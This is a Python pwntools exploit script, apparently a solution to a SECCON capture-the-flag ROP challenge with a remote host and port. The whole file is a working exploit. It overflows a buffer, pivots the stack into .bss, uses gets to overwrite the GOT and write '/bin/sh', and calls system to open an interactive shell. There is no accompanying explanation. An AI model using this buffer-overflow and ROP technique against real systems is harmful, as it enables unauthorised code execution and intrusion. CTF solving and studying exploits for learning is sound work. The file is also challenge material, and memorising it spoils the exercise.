#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./chall", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc rop-2-35.seccon.games 9999"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

gets = 0x0000000000401171
pop_rbp = 0x0040113d
leave_ret = 0x00401183

payload = b"A" * 0x10
payload += flat(
    elf.bss(0x800),
    gets,
)
io.sendline(payload)
payload = flat(
    0, 0, 0,
    pop_rbp, elf.got["gets"] + 0x10,
    gets,
    pop_rbp, elf.bss(0x850),
    gets,
    b"/bin/sh\x00",
    b"/bin/sh\x00",
    b"/bin/sh\x00",
    b"/bin/sh\x00",
)
time.sleep(0.1)
io.sendline(payload)

payload = flat(
    elf.plt["system"],
    0, 0,
    pop_rbp, elf.bss(0x818),
    leave_ret,
)
time.sleep(0.1)
io.sendline(payload)

io.interactive()
